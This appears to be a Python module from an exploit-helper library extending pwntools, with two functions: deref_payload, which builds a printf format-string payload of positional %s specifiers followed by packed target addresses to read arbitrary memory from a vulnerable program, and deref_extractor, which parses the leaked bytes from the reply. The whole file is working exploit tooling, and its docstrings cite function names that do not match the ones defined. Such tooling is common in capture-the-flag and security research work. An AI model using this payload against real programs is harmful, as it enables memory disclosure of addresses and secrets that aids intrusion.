'''tools for printf leaking, which pwntools
(at the time of writing) appears to lack'''
from typing import List
from pwnscripts.string_checks import *

def deref_payload(buffer_offset: int, addr: List[int]):
    '''Make a suboptimal printf payload for dereferencing the addresses
    in `addr`.
    It's sister function, _deref_extractor(), can be used to get the
    result of the dereferencing.'''
    # You could fit this into one line, but readability
    len_addr = len(addr)
    extra_len = len('%$s||')+len(str(buffer_offset+len_addr))+1  #length of one %{}$s, maximally
    extra_offset = (len_addr*extra_len + len('^^$$')) // (context.bits//8)    # length of ^^ + all %{}$s, divided by the word size
    off = buffer_offset + extra_offset
	
    # payload
    payload = '||'.join("%{}$s".format(i) for i in range(off, off+len(addr)))
    payload = '^^' + payload + '$$'
    payload = payload.ljust(extra_offset*context.bits//8,'\x19').encode()
    payload += b''.join(map(packn, addr))
    return payload

def deref_extractor(resp: bytes):
    '''Extract the bytestrings leaked using a _deref_payload()
    Example usage:
    r.sendline(leak_printf_deref_payload(...))
    extracted = leak_printf_deref_extractor(r.recvline())'''
    resp = resp[ resp.find(b'^^')+2 : resp.find(b'$$') ]
    return resp.split(b'||')
